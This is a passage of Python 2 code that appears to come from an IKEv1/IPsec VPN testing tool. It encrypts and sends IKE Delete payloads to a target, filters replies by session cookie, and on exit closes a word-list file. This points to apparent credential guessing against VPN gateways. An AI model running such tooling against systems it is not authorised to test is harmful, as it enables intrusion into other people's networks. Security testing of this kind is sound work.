                                plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                if debug > 0:
                                        print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                #Calc message ID and current IV
                                msgID = "0000111b"
                                curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                encPayload = cipher.encrypt(plainPayload)
                                if debug > 0:
                                        print "Encrypted Payload: %s"%encPayload.encode('hex')

                                arrayencPayload = array.array('B', encPayload)
                                lenencPayload = len(arrayencPayload)
                                bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)

                                arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
                                lenHDR = len(arrayHDR)
                                bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)

                                #Send Delete payload
                                bytesIKE = bytesHDR+bytesencPayload
                                ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
				#del packets[-2]
                        	time.sleep(5)
				continue
			
			else:
				if debug > 0:
					print "Still receiving packets, but exiting..."
				dicCrypto["lastBlock"] = packets[-1][-IVlen:]
				curIV = bytesIKE.encode('hex')[-IVlen:]
				del packets[-2]
				time.sleep(5)
				exit()

		else:
			print "Unexpected packet received!!"
                        #Parse the header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])
                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
                                print "Packet received does not match this session, this is probably from a previous incarnation."
                                del packets[-1]
                                print len(packets)
                                print packets[-1]
                                print "Removing packet"
                                continue

                        #Check for informational packet
                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."
                                respDict  = ikeHandling.main(packets[-1],encType,hashType)
				time.sleep(2)
                                exit()
                        else:
                                pass		

			exit()

	    else:
		print "Received unexpected packet.\nExiting"
		time.sleep(2)
		exit()


    except  (KeyboardInterrupt, SystemExit):
	try:
		wordsfile.close()
	except:
		pass
	print "Shutting down server\n\n"
	t.join(2)
